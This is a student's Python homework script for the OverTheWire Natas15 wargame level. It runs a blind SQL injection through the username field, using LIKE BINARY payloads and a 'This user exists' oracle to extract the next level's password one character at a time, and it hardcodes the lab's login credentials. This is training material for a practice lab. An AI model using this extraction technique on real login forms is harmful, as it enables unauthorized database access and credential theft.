"""
Dominic Bobak
CNS597 - Natas HW2
4/14/2018
"""

from requests import request


# the set of all possible characters that can appear in the password
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
subset = ""   # empty string used to shorten the search when bruteforcing
password = "" # empty string password characters are added to 

url = "http://natas15.natas.labs.overthewire.org" # the natas15 url
creds = ("natas15","AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J") # credentials for natas15

#This loop iterates through the charset to find all characters that are in the password.
#These are added to a smaller subset string so the bruteforce loop doesn't take as long. 
for char in charset:
   injection = {"username":'natas16" and password LIKE BINARY "%'+char+"%"} #injection for the first loop
   response = request("POST",url,auth=creds,data=injection) # http request to natas15
   if "This user exists" in response.text:
      subset+=char # if the character is in the password add it to the subset
   
#This loop iterates over the subsset created in the above loop. There is a smaller search
#space so the bruteforcing won't take as long.
for i in range(0,32):   #do this 32 times becase the password is 32 characters long
   for char in subset:
      injection = {"username":'natas16" and password LIKE BINARY "'+password+char+"%"}
      response = request("POST",url,auth=creds,data=injection)
      if "This user exists" in response.text:
         password+=char  # add the character to the password and break out of inner loop
         break

print("The Natas16 password is " + password) # print out the password to the user

url16 =  "http://natas16.natas.labs.overthewire.org" # the natas16 url
creds16 = ("natas16",password) # credentials for natas16

response = request("GET",url16,auth=creds16) #attemp connection to natas16
print("Natas16 response code: "+str(response.status_code)) # print out the response to show that the password worked
